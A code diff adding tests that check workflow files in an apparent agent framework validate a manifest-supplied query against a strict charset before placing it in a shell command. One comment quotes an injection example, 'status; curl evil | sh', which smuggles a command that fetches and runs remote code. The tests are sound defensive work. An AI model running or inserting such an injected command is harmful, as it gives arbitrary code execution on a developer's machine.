@@ -659,3 +659,118 @@ describe('ship:pre generic gate evaluation — third-party overlay gate (#3559)'
   });
 
 });
+
+// ─── 6. Every generic gate-dispatch site validates before shell use (#3559) ───
+//
+// The command-injection surface fixed at ship:pre is a FAMILY property, not a site
+// property: any workflow that interpolates a manifest-supplied `check.query` into a
+// shell command has it. This section enumerates the family by DISCOVERY rather than by
+// a hardcoded list, so a new dispatch site added later without the validation contract
+// fails here instead of shipping — which is the same "hardcoded list silently misses
+// members" mistake #3559 itself was.
+
+const WORKFLOWS_DIR = path.join(__dirname, '..', 'gsd-core', 'workflows');
+
+// A manifest-supplied query interpolated into a shell command substitution.
+const SHELL_INTERPOLATED_QUERY = /gsd_run check \$\{hook\.check\.query\}/;
+// The charset a query must be validated against before it may be run.
+const VALIDATION_CHARSET = /\^\[a-z\]\[a-z0-9-\]\*\( \[a-z\]\[a-z0-9-\]\*\)\*\$/;
+
+function workflowFilesWithShellInterpolatedQuery() {
+  // allow-test-rule: source-text-is-the-product (#3559)
+  // gsd-core/workflows/*.md are shipped content executed by the agent runtime — the text
+  // IS the deployed dispatch contract, so the validation instruction only exists here.
+  return fs.readdirSync(WORKFLOWS_DIR)
+    .filter(name => name.endsWith('.md'))
+    .map(name => ({ name, body: fs.readFileSync(path.join(WORKFLOWS_DIR, name), 'utf8') }))
+    .filter(f => SHELL_INTERPOLATED_QUERY.test(f.body));
+}
+
+describe('capability gate dispatch — manifest input is validated before shell use (#3559)', () => {
+
+  test('the discovery scan finds the known dispatch family (guards against a vacuous pass)', () => {
+    const found = workflowFilesWithShellInterpolatedQuery().map(f => f.name).sort();
+
+    // If the interpolation form is ever renamed, the scan below would silently match
+    // nothing and every assertion in this section would pass vacuously. Pin the floor.
+    assert.ok(
+      found.length >= 4,
+      `expected at least 4 workflows interpolating a manifest query into a shell command, found ` +
+      `${found.length} (${found.join(', ')}). A near-zero count means SHELL_INTERPOLATED_QUERY no ` +
+      'longer matches the deployed form and this whole section is passing vacuously.',
+    );
+    for (const expected of ['execute-phase.md', 'plan-phase.md', 'ship.md', 'verify-work.md']) {
+      assert.ok(found.includes(expected), `${expected} must be in the dispatch family, got ${found.join(', ')}`);
+    }
+  });
+
+  for (const { name } of workflowFilesWithShellInterpolatedQuery()) {
+    test(`${name} validates a manifest-supplied check.query before running it`, () => {
+      const body = fs.readFileSync(path.join(WORKFLOWS_DIR, name), 'utf8');
+
+      // `gates[].check` is not one of the four executable surfaces the install consent
+      // prompt discloses, so a capability consented to as declarative-only can still reach
+      // a shell through it. A query of `status; curl evil | sh` interpolated unquoted into
+      // $( ) is arbitrary code execution as the developer.
+      assert.match(
+        body,
+        VALIDATION_CHARSET,
+        `${name} interpolates a manifest-supplied check.query into a shell command but never ` +
+        'pins the charset it must be validated against first. See the `gate` section of ' +
+        'gsd-core/references/loop-hook-dispatch.md.',
+      );
+      assert.match(
+        body,
+        /IN-CONTEXT/,
+        `${name} must specify that validation happens in-context — never by pasting the value ` +
+        'into a shell to be tested there, which is already too late.',
+      );
+      assert.ok(
+        body.search(VALIDATION_CHARSET) < body.search(SHELL_INTERPOLATED_QUERY),
+        `${name} states the validation rule only AFTER the interpolation it is supposed to ` +
+        'guard; an executing agent reads top-down and would run the command first.',
+      );
+    });
+  }
+
+  test('the reference contract states the rule for gates, not only for steps', () => {
+    // allow-test-rule: source-text-is-the-product (#3559)
+    const ref = fs.readFileSync(
+      path.join(__dirname, '..', 'gsd-core', 'references', 'loop-hook-dispatch.md'), 'utf8');
+
+    const gateSection = ref.slice(ref.indexOf('### `gate`'));
+    assert.notStrictEqual(gateSection.length, 0, 'the reference must carry a gate section');
+    assert.match(
+      gateSection,
+      VALIDATION_CHARSET,
+      'loop-hook-dispatch.md mandated in-context validation for `step` -> ref.command but omitted ' +
+      'it for `gate`. That asymmetry is the root cause of #3559 and its four sibling sites: every ' +
+      'gate consumer inherited an unstated requirement.',
+    );
+  });
+
+  test('onError vocabulary matches what the registry and every manifest actually use', () => {
+    // allow-test-rule: source-text-is-the-product (#3559)
+    const ref = fs.readFileSync(
+      path.join(__dirname, '..', 'gsd-core', 'references', 'loop-hook-dispatch.md'), 'utf8');
+
+    // The reference documented skip/"fail"; the generated registry, every shipped manifest,
+    // and all four dispatch sites use skip/halt. "fail" was a value nothing could ever emit,
+    // so a consumer implementing the doc literally would mis-route every error case.
+    const declared = new Set(
+      realRegistry.byLoopPoint['ship:pre'].gates.map(g => g.onError).filter(Boolean));
+    assert.ok(declared.size > 0, 'ship:pre gates must declare an onError policy');
+    for (const value of declared) {
+      assert.ok(
+        ['halt', 'skip'].includes(value),
+        `registry emits onError "${value}" outside the documented {halt, skip} vocabulary`,
+      );
+    }
+    assert.doesNotMatch(
+      ref,
+      /`fail` means surface the error and stop/,
+      'loop-hook-dispatch.md must not document an onError value no capability can emit',
+    );
+  });
+
+});
